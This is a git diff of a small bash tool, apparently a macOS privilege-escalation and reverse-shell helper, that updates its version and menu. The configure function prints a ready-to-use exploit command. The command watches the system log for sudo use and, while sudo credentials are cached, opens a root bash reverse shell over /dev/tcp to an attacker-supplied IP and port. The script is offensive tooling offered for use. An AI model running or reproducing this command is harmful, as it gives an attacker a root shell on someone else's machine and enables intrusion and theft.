@@ -1,6 +1,6 @@
 #!/bin/bash
 author=psychokiller
-bpver=1.0
+bpver=1.1
 #Props to Seb from hak5 - I`m bash n00b so some of the interface is based on Sebkinne's wp6.sh
 #Artwork - http://chris.com/ascii/index.php?art=animals/other%20%28water%29
 #Idea - Someone on apple forums posted a similar but broken PoC - found this after googling for information on this topic: https://discussions.apple.com/thread/7621223?start=0&tstart=0
@@ -33,6 +33,7 @@ function menu {
     case "$key" in
             [cC]) configure;;
             [mM]) manageshell;;
+	    [lL]) echo "sexy logo because its 2016 and CVE IDs are boring" && menu;;
             [qQ]) printf "\n"; exit;;
     esac
 }
@@ -42,7 +43,7 @@ function configure {
   read ip
   printf "    enter a port to listen for the shell on: "
   read port
-  echo "    $(tput bold)exploit$(tput sgr0): tail -F -n 0 /var/log/system.log | grep --line-buffered sudo | while read ; do while true; do sudo bash -i >& /dev/tcp/$ip/$port 0>&1; done; done"
+  echo "    $(tput bold)exploit:$(tput sgr0) tail -F -n 0 /var/log/system.log | grep --line-buffered sudo | while read ; do while true; do sudo bash -i >& /dev/tcp/$ip/$port 0>&1; done; done"
   echo ""
   menu
 }
